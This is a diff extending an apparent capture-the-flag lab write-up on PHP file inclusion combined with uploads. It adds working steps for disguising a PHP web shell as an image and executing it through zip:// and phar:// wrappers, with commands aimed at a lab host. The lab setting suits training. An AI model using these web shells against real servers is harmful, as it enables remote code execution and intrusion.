@@ -59,3 +59,53 @@ curl -s "http://94.237.58.135:51980/index.php?language=./profile_images/shell.gi
 curl -s "http://94.237.58.135:51980/index.php?language=./profile_images/shell.gif&cmd=cat%20/2f40d853e2d4768d87da1c81772bae0a.txt"
 ```
 I got the flag and completed the challenge!
+
+## Alternative Methods
+
+## 1. Zip Upload
+
+Utilize PHP's `zip://` wrapper to execute code stored within a ZIP archive.
+
+## Steps
+### Step 1: Create a PHP web shell script and compress it into a ZIP archive
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+```
+### Steps 2: Upload the ZIP archive (shell.jpg)
+
+### Step 3: Include and execute commands via the wrapper
+```bash
+http://94.237.58.135:51980/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+```
+### Notes:
+
+The ZIP wrapper is not enabled by default, so this method may not always work.
+
+Some upload forms may detect ZIP archives despite their disguised extensions.
+
+## 2. Phar Upload
+
+Use PHP's `phar://` wrapper to execute code embedded in a PHAR archive.
+
+## Steps
+### Step 1: Write a PHP script to create a PHAR archive containing a web shell
+
+```bash
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+$phar->stopBuffering();
+```
+### Step 2: Compile the script into a PHAR file and rename it as `shell.jpg`
+```bash
+php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+```
+### step 3: Upload the PHAR file and include it using the `phar://` wrapper
+```bash
+http://94.237.58.135:51980/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
+```
+### Notes:
+
+Ensure that PHAR support is enabled in PHP configurations.
